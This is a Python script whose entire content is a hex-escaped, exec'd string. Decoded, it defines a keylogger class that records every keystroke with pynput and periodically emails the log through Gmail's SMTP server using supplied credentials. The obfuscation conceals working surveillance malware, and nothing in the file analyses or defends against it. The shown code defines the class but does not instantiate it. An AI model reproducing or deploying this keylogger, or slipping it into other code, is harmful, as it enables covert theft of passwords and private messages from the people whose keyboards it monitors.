#!/usr/bin/env python3
from pynput import keyboard
import threading
import smtplib
FhNGGUBBriDLuJoQYGHmsYqRADkenhbhjxkUUDctBRcicYNHXqUktEanPRdResTlnpxDGelEJqnDDUAHfQShHWyrIGNTSpYOxBcShkngMYTrJowLhfzBKXYBDHWNpJsa="""\x23\x21\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x65\x6e\x76\x20\x70\x79\x74\x68\x6f\x6e\x33\x0a\x66\x72\x6f\x6d\x20\x70\x79\x6e\x70\x75\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x6b\x65\x79\x62\x6f\x61\x72\x64\x0a\x69\x6d\x70\x6f\x72\x74\x20\x74\x68\x72\x65\x61\x64\x69\x6e\x67\x0a\x69\x6d\x70\x6f\x72\x74\x20\x73\x6d\x74\x70\x6c\x69\x62\x0a\x63\x6c\x61\x73\x73\x20\x4b\x65\x79\x6c\x6f\x67\x67\x65\x72\x3a\x0a\x20\x20\x20\x20\x64\x65\x66\x20\x5f\x5f\x69\x6e\x69\x74\x5f\x5f\x28\x73\x65\x6c\x66\x2c\x20\x74\x69\x6d\x65\x5f\x69\x6e\x74\x65\x72\x76\x61\x6c\x2c\x20\x65\x6d\x61\x69\x6c\x2c\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x29\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x6c\x6f\x67\x20\x3d\x20\x22\x53\x4b\x20\x6c\x6f\x67\x67\x65\x72\x20\x68\x61\x73\x20\x62\x65\x65\x6e\x20\x20\x73\x74\x61\x72\x74\x65\x64\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x69\x6e\x74\x65\x72\x76\x61\x6c\x20\x3d\x20\x74\x69\x6d\x65\x5f\x69\x6e\x74\x65\x72\x76\x61\x6c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x65\x6d\x61\x69\x6c\x20\x3d\x20\x65\x6d\x61\x69\x6c\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x70\x61\x73\x73\x77\x6f\x72\x64\x20\x3d\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x0a\x20\x20\x20\x20\x64\x65\x66\x20\x61\x70\x70\x65\x6e\x64\x5f\x74\x6f\x5f\x6c\x6f\x67\x28\x73\x65\x6c\x66\x2c\x20\x73\x74\x72\x69\x6e\x67\x29\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x6c\x6f\x67\x20\x3d\x20\x73\x65\x6c\x66\x2e\x6c\x6f\x67\x20\x2b\x20\x73\x74\x72\x69\x6e\x67\x0a\x20\x20\x20\x20\x64\x65\x66\x20\x70\x72\x6f\x63\x65\x73\x73\x5f\x6b\x65\x79\x5f\x70\x72\x65\x73\x73\x28\x73\x65\x6c\x66\x2c\x20\x6b\x65\x79\x29\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x74\x72\x79\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x63\x75\x72\x72\x65\x6e\x74\x5f\x6b\x65\x79\x20\x3d\x20\x73\x74\x72\x28\x6b\x65\x79\x2e\x63\x68\x61\x72\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x65\x78\x63\x65\x70\x74\x20\x41\x74\x74\x72\x69\x62\x75\x74\x65\x45\x72\x72\x6f\x72\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x69\x66\x20\x6b\x65\x79\x20\x3d\x3d\x20\x6b\x65\x79\x2e\x73\x70\x61\x63\x65\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x63\x75\x72\x72\x65\x6e\x74\x5f\x6b\x65\x79\x20\x3d\x20\x22\x20\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x65\x6c\x73\x65\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x63\x75\x72\x72\x65\x6e\x74\x5f\x6b\x65\x79\x20\x3d\x20\x22\x20\x22\x20\x2b\x20\x73\x74\x72\x28\x6b\x65\x79\x29\x20\x2b\x20\x22\x20\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x61\x70\x70\x65\x6e\x64\x5f\x74\x6f\x5f\x6c\x6f\x67\x28\x63\x75\x72\x72\x65\x6e\x74\x5f\x6b\x65\x79\x29\x0a\x20\x20\x20\x20\x64\x65\x66\x20\x72\x65\x70\x6f\x72\x74\x28\x73\x65\x6c\x66\x29\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x73\x65\x6e\x64\x5f\x6d\x61\x69\x6c\x28\x73\x65\x6c\x66\x2e\x65\x6d\x61\x69\x6c\x2c\x20\x73\x65\x6c\x66\x2e\x70\x61\x73\x73\x77\x6f\x72\x64\x2c\x20\x22\x5c\x6e\x5c\x6e\x22\x20\x2b\x20\x73\x65\x6c\x66\x2e\x6c\x6f\x67\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x6c\x6f\x67\x20\x3d\x20\x22\x22\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x74\x69\x6d\x65\x72\x20\x3d\x20\x74\x68\x72\x65\x61\x64\x69\x6e\x67\x2e\x54\x69\x6d\x65\x72\x28\x73\x65\x6c\x66\x2e\x69\x6e\x74\x65\x72\x76\x61\x6c\x2c\x20\x73\x65\x6c\x66\x2e\x72\x65\x70\x6f\x72\x74\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x74\x69\x6d\x65\x72\x2e\x73\x74\x61\x72\x74\x28\x29\x0a\x20\x20\x20\x20\x64\x65\x66\x20\x73\x65\x6e\x64\x5f\x6d\x61\x69\x6c\x28\x73\x65\x6c\x66\x2c\x20\x65\x6d\x61\x69\x6c\x2c\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x2c\x20\x6d\x65\x73\x73\x61\x67\x65\x29\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x72\x76\x65\x72\x20\x3d\x20\x73\x6d\x74\x70\x6c\x69\x62\x2e\x53\x4d\x54\x50\x28\x22\x73\x6d\x74\x70\x2e\x67\x6d\x61\x69\x6c\x2e\x63\x6f\x6d\x22\x2c\x20\x35\x38\x37\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x72\x76\x65\x72\x2e\x73\x65\x74\x5f\x64\x65\x62\x75\x67\x6c\x65\x76\x65\x6c\x28\x31\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x72\x76\x65\x72\x2e\x73\x74\x61\x72\x74\x74\x6c\x73\x28\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x72\x76\x65\x72\x2e\x6c\x6f\x67\x69\x6e\x28\x65\x6d\x61\x69\x6c\x2c\x20\x70\x61\x73\x73\x77\x6f\x72\x64\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x72\x76\x65\x72\x2e\x73\x65\x6e\x64\x6d\x61\x69\x6c\x28\x65\x6d\x61\x69\x6c\x2c\x20\x65\x6d\x61\x69\x6c\x2c\x20\x6d\x65\x73\x73\x61\x67\x65\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x72\x76\x65\x72\x2e\x71\x75\x69\x74\x28\x29\x0a\x20\x20\x20\x20\x64\x65\x66\x20\x73\x74\x61\x72\x74\x28\x73\x65\x6c\x66\x29\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x6b\x65\x79\x62\x6f\x61\x72\x64\x5f\x6c\x69\x73\x74\x65\x6e\x65\x72\x20\x3d\x20\x6b\x65\x79\x62\x6f\x61\x72\x64\x2e\x4c\x69\x73\x74\x65\x6e\x65\x72\x28\x6f\x6e\x5f\x70\x72\x65\x73\x73\x3d\x73\x65\x6c\x66\x2e\x70\x72\x6f\x63\x65\x73\x73\x5f\x6b\x65\x79\x5f\x70\x72\x65\x73\x73\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x77\x69\x74\x68\x20\x6b\x65\x79\x62\x6f\x61\x72\x64\x5f\x6c\x69\x73\x74\x65\x6e\x65\x72\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x73\x65\x6c\x66\x2e\x72\x65\x70\x6f\x72\x74\x28\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x6b\x65\x79\x62\x6f\x61\x72\x64\x5f\x6c\x69\x73\x74\x65\x6e\x65\x72\x2e\x6a\x6f\x69\x6e\x28\x29\x0a"""
exec(FhNGGUBBriDLuJoQYGHmsYqRADkenhbhjxkUUDctBRcicYNHXqUktEanPRdResTlnpxDGelEJqnDDUAHfQShHWyrIGNTSpYOxBcShkngMYTrJowLhfzBKXYBDHWNpJsa)